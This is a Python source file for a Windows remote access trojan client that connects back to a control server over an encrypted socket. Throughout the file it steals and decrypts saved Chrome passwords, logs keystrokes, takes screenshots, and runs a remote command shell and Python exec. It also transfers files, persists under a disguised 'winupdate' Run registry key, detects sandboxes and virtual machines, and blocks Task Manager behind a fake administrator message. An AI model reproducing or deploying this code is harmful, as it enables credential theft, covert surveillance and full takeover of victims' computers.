
import socket, os, sys, platform, time, ctypes, subprocess, pyscreeze, threading, pynput.keyboard, wmi, json
import win32api, winerror, win32event
from shutil import copyfile
import shutil
from winreg import *
from io import StringIO, BytesIO
from cryptography.fernet import Fernet
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES

from datetime import timezone, datetime, timedelta


strHost = "127.0.0.1"
# strHost = socket.gethostbyname("")
intPort = 3000

strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ["TEMP"]  # get temp path
APPDATA = os.environ["APPDATA"]
intBuff = 1024

blnMeltFile = False
blnAddToStartup = False

# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


# function to move file to tmp dir and relaunch
def meltFile():
    winupdate = os.path.join(TMP, "winupdate")
    # ignore if the path is in appdata as well
    if not (os.getcwd() == winupdate) and not (os.getcwd() == APPDATA):
        # if folder already exists
        try:
            os.mkdir(winupdate)
        except:
            pass
        strNewFile = os.path.join(winupdate, os.path.basename(sys.argv[0]))

        strCommand = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {winupdate}\\ & {strNewFile}"
        subprocess.Popen(strCommand, shell=True)
        sys.exit(0)


def detectSandboxie():
    try:
        ctypes.windll.LoadLibrary("SbieDll.dll")
    except Exception:
        return False
    return True


def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return True
    return False



def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def getchromepass():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            if date_created != 86400000000 and date_created:
                creation_date = f"Creation date: {str(get_chrome_datetime(date_created))}"
                
            if date_last_used != 86400000000 and date_last_used:
                last_used = f"Last Used: {str(get_chrome_datetime(date_last_used))}"
                space = f"="*50
                logs = f'\n{space}\nURL: {origin_url} \nUsername: {username}\nPassword: {password}\n{creation_date}\n{last_used}\n{space}'
            send(bytes(logs,'utf-8'))

    
        else:
            send(bytes('No save chrome password found on target!!!', 'utf-8'))
            continue
        

    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


def startup(onstartup):
    try:
        strAppPath = os.path.join(APPDATA, os.path.basename(strPath))
        if not os.getcwd() == APPDATA:
            copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath)
        CloseKey(objRegKey)
    except WindowsError:
        if not onstartup:
            send(b"Unable to add to startup!")
    else:
        if not onstartup:
            send(b"success")


def remove_from_startup():
    try:
        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        DeleteValue(objRegKey, "winupdate")
        CloseKey(objRegKey)
    except FileNotFoundError:
        send(b"Program is not registered in startup.")
    except WindowsError:
        send(b"Error removing value!")
    else:
        send(b"success")


def server_connect():
    global objSocket, objEncryptor
    while True:  # infinite loop until socket can connect
        try:
            objSocket = socket.socket()
            objSocket.connect((strHost, intPort))
        except socket.error:
            time.sleep(5)  # wait 5 seconds to try again
        else:
            break

    arrUserInfo = [socket.gethostname()]
    strPlatform = f"{platform.system()} {platform.release()}"
    if detectSandboxie():
        strPlatform += " (Sandboxie) "
    if detectVM():
        strPlatform += " (Virtual Machine) "
    arrUserInfo.extend([strPlatform, os.environ["USERNAME"]])

    objSocket.send(json.dumps(arrUserInfo).encode())

    objEncryptor = Fernet(objSocket.recv(intBuff))


# function to receive data
recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))

# function to send data
send = lambda data: objSocket.send(objEncryptor.encrypt(data))

if blnMeltFile: meltFile()
if blnAddToStartup: startup(True)

server_connect()


def OnKeyboardEvent(event):
    global strKeyLogs

    try:  # check to see if variable is defined
        strKeyLogs
    except NameError:
        strKeyLogs = ""

    if event == Key.backspace:
        strKeyLogs += " [Bck] "
    elif event == Key.tab:
        strKeyLogs += " [Tab] "
    elif event == Key.enter:
        strKeyLogs += "\n"
    elif event == Key.space:
        strKeyLogs += " "
    elif type(event) == Key:  # if the character is some other type of special key
        strKeyLogs += f" [{str(event)[4:]}] "
    else:
        strKeyLogs += f"{event}"[1:len(str(event)) - 1]


KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
Key = pynput.keyboard.Key


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while len(bytData) < buffer:
        bytData += objSocket.recv(buffer)
    return objEncryptor.decrypt(bytData)


def sendall(data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(str(intDataSize).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)


# vbs message box
def MessageBox(message):
    strScript = os.path.join(TMP, "m.vbs")
    with open(strScript, "w") as objVBS:
        objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                     shell=True)


def screenshot():
    # Take Screenshot
    objImage = pyscreeze.screenshot()
    # Create BytesIO Object as objBytes
    with BytesIO() as objBytes:
        # Save Screenshot into BytesIO Object
        objImage.save(objBytes, format="PNG")
        # Get BytesIO Object Data as bytes
        objPic = objBytes.getvalue()

    sendall(objPic)


def file_browser():
    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
    arrRawDrives = arrRawDrives.split("\000")[:-1]

    strDrives = ""
    for drive in arrRawDrives:  # get proper view and place array into string
        strDrives += drive.replace("\\", "") + "\n"
    send(strDrives.encode())

    strDir = recv(intBuff).decode()

    if os.path.isdir(strDir):
        if strDir[:-1] != "\\" or strDir[:-1] != "/":
            strDir += "\\"
        arrFiles = os.listdir(strDir)

        strFiles = ""
        for file in arrFiles:
            strFiles += f"{file}\n"

        sendall(strFiles.encode())

    else:  # if the user entered an invalid directory
        send(b"Invalid Directory!")
        return


def upload(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = recv(intBuff).decode()

    try:
        with open(strOutputFile, "wb") as objFile:
            objFile.write(file_data)
        send(b"Done!")
    except:
        send(b"Path is protected/invalid!")


def receive(data):
    if not os.path.isfile(data):
        send(b"Target file not found!")
        return

    with open(data, "rb") as objFile:
        sendall(objFile.read())  # Send Contents of File


def lock():
    ctypes.windll.user32.LockWorkStation()  # lock pc


def shutdown(shutdowntype):
    command = f"shutdown {shutdowntype} -f -t 30"
    subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    objSocket.close()  # close connection and exit
    sys.exit(0)


def command_shell():
    strCurrentDir = os.getcwd()
    send(os.getcwdb())
    bytData = b""

    while True:
        strData = recv(intBuff).decode()

        if strData == "goback":
            os.chdir(strCurrentDir)  # change directory back to original
            break

        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE, shell=True)
            if objCommand.stderr.read().decode() == "":  # if there is no error
                strOutput = (objCommand.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                os.chdir(strOutput)  # change directory

                bytData = f"\n{os.getcwd()}>".encode()  # output to send the server

        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE, shell=True)
            strOutput = objCommand.stdout.read() + objCommand.stderr.read()  # since cmd uses bytes, decode it
            bytData = (strOutput + b"\n" + os.getcwdb() + b">")
        else:
            bytData = b"Error!"

        sendall(bytData)  # send output


def python_interpreter():
    send(b"received")
    while True:
        strCommand = recv(intBuff).decode()
        if strCommand == "exit":
            send(b"exiting")
            break
        old_stdout = sys.stdout
        redirected_output = sys.stdout = StringIO()
        try:
            exec(strCommand)
            print()
            strError = None
        except Exception as e:
            strError = f"{e.__class__.__name__}: "
            try:
                strError += f"{e.args[0]}"
            except:
                pass
        finally:
            sys.stdout = old_stdout

        if strError:
            sendall(strError.encode())
        else:
            sendall(redirected_output.getvalue().encode())


def vbs_block_process(process, popup=False):
    # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
    # popup: list
    # [message, title, timeout, type]

    strVBSCode = "On Error Resume Next\n" + \
                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\n" + \
                 "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")\n" + \
                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
                 f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
                 "objLatestProcess.TargetInstance.Terminate\n"
    if popup:  # if showing a message
        strVBSCode += f'objWshShl.Popup "{popup[0]}", {popup[2]}, "{popup[1]}", {popup[3]}\n'

    strVBSCode += "End If\nLoop"

    strScript = os.path.join(TMP, "d.vbs")

    with open(strScript, "w") as objVBSFile:
        objVBSFile.write(strVBSCode)

    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                     shell=True)  # run the script


def disable_taskmgr():
    global blnDisabled
    if not blnDisabled:  # if task manager is already disabled, enable it
        send(b"Enabling ...")

        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         stdin=subprocess.PIPE, shell=True)

        blnDisabled = True
    else:
        send(b"Disabling ...")

        popup = ["Task Manager has been disabled by your administrator", "Task Manager", "3", "16"]

        vbs_block_process("taskmgr.exe", popup=popup)
        blnDisabled = False


def keylogger(option):
    global strKeyLogs

    if option == "start":
        if not KeyListener.running:
            KeyListener.start()
            send(b"success")
        else:
            send(b"error")

    elif option == "stop":
        if KeyListener.running:
            KeyListener.stop()
            threading.Thread.__init__(KeyListener)  # re-initialise the thread
            strKeyLogs = ""
            send(b"success")
        else:
            send(b"error")

    elif option == "dump":
        if not KeyListener.running:
            send(b"error")
        else:
            if strKeyLogs == "":
                send(b"error2")
            else:
                time.sleep(0.2)
                sendall(strKeyLogs.encode())
                strKeyLogs = ""  # clear logs


def run_command(command):
    bytLogOutput = b"\n"

    if len(command) > 0:
        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                      shell=True)
        bytLogOutput += objCommand.stdout.read() + objCommand.stderr.read()
    else:
        bytLogOutput += b"Error!"

    sendall(bytLogOutput)


while True:
    try:
        while True:
            strData = recv(intBuff)
            strData = strData.decode()

            if strData == "exit":
                objSocket.close()
                sys.exit(0)
            elif strData[:3] == "msg":
                MessageBox(strData[3:])
            elif strData == "startup":
                startup(False)
            elif strData == "rmvstartup":
                remove_from_startup()
            elif strData == "screen":
                screenshot()
            elif strData == "filebrowser":
                file_browser()
            elif strData == 'getchromepass':
                getchromepass()
            elif strData[:4] == "send":
                upload(strData[4:])
            elif strData[:4] == "recv":
                receive(strData[4:])
            elif strData == "lock":
                lock()
            elif strData == "shutdown":
                shutdown("-s")
            elif strData == "restart":
                shutdown("-r")
            elif strData == "test":
                continue
            elif strData == "cmd":
                command_shell()
            elif strData == "python":
                python_interpreter()
            elif strData == "keystart":
                keylogger("start")
            elif strData == "keystop":
                keylogger("stop")
            elif strData == "keydump":
                keylogger("dump")
            elif strData[:6] == "runcmd":
                run_command(strData[6:])
            elif strData == "dtaskmgr":
                if not "blnDisabled" in globals():  # if the variable doesnt exist yet
                    blnDisabled = True
                disable_taskmgr()
    except socket.error:  # if the server closes without warning
        objSocket.close()
        del objSocket
        server_connect()

# eof
